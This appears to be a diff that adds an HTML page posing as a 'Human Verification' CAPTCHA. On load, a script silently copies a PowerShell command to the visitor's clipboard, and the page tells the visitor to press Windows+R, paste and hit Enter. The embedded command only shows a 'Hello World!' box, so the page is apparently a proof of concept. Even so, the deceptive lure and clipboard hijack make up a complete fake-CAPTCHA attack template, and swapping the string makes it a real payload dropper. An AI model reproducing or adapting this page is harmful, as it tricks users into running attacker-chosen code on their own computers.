@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Human Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(45deg, #36d1dc, #5b86e5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        .captcha-container {
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 400px;
+            padding: 40px;
+            text-align: center;
+        }
+
+        h2 {
+            font-weight: 500;
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        .captcha-container p {
+            color: #666;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+
+        .captcha-container .instructions {
+            margin-bottom: 20px;
+            font-size: 16px;
+        }
+
+        .captcha-container .keys {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .captcha-container .keys span {
+            display: inline-block;
+            padding: 10px 15px;
+            border-radius: 5px;
+            background-color: #f0f0f0;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            font-size: 18px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .captcha-container .keys .windows-key {
+            display: flex;
+            align-items: center;
+        }
+
+        .captcha-container .keys img {
+            width: 20px;
+            height: 20px;
+            margin-right: 5px;
+        }
+
+        .captcha-container .success-message {
+            margin-top: 20px;
+            font-size: 14px;
+            color: green;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="captcha-container">
+        <h2>Human Verification Required</h2>
+        <p>To confirm you're human, follow these steps:</p>
+
+        <div class="instructions">
+            1. Allow verification using clipboard <br>
+            2. To verify, press the following keys:
+        </div>
+
+        <div class="keys">
+            <span class="windows-key"><img src=”data:image/png;base64,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” alt=”WindowsKey” width=”200px” height=”20px”></span>
+            <span>+</span>
+            <span>R</span>
+        </div>
+
+        <div class="instructions">
+            <strong>Ctrl</strong><strong> + V</strong><br>
+            <strong>Enter</strong>
+        </div>
+
+        
+    </div>
+
+    <script>
+        
+            
+        async function copyText() {
+            const textToCopy = 'powershell.exe Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show(\'Hello World!\');';    
+            
+                await navigator.clipboard.writeText(textToCopy);
+            
+        }
+
+        function copyText2() {
+         //const textToCopy = 'powershell.exe Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show(\'Hello World!\');'; 
+         const textArea = document.createElement("textarea")   
+
+         textArea.value = 'powershell.exe Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show(\'Hello World!\');'; 
+         
+         document.body.appendChild(textArea)
+         textArea.select();
+         document.execCommand("copy");
+         document.body.removeChild(textArea)
+            
+        }
+
+
+
+        document.addEventListener("DOMContentLoaded",copyText);
+        
+    </script>
+
+</body>
+</html>
